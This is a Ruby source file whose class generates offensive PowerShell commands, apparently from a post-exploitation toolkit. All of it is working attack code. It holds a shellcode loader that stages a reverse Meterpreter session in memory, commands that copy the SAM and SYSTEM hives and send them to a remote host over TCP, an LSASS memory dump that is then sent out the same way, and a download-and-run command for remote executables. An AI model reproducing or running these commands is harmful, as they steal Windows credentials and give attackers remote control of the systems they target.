#!/usr/bin/env ruby
class PowershellCommands
  def reverse_meterpreter(shellcode)
    powershell_command = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel 32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni -enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";})
    return powershell_command
  end
  def hash_dump(host,port)
    sam = 'c:\windows\temp\sam'
    sys = 'c:\windows\temp\sys'
    powershell_command = %($sam_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sam}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("sam");$writer.flush();$writer.WriteLine($sam_file);$socket.close();$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$sys_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sys}"));$stream = $socket.GetStream();$writer = new-object  System.IO.StreamWriter($stream);$writer.WriteLine("sys");$writer.flush();$writer.WriteLine($sys_file);$socket.close())
    return powershell_command
  end
  def lsass_dump(host,port)
    lsass_file = 'c:\windows\temp\lsass.dmp'
    powershell_command1 = %($proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2; $FileStream = New-Object IO.FileStream("#{lsass_file}", [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit)
     powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_file}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("lsass");$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
    return powershell_command1,powershell_command2
  end
  def wget_powershell(web_server,executable)
    powershell_command = %((new-object System.Net.WebClient).DownloadFile('#{web_server}/#{executable}', c:\\windows\\temp\\#{executable}'); Start-Process c:\\windows\\temp\\#{executable}")
    return powershell_command
  end
end
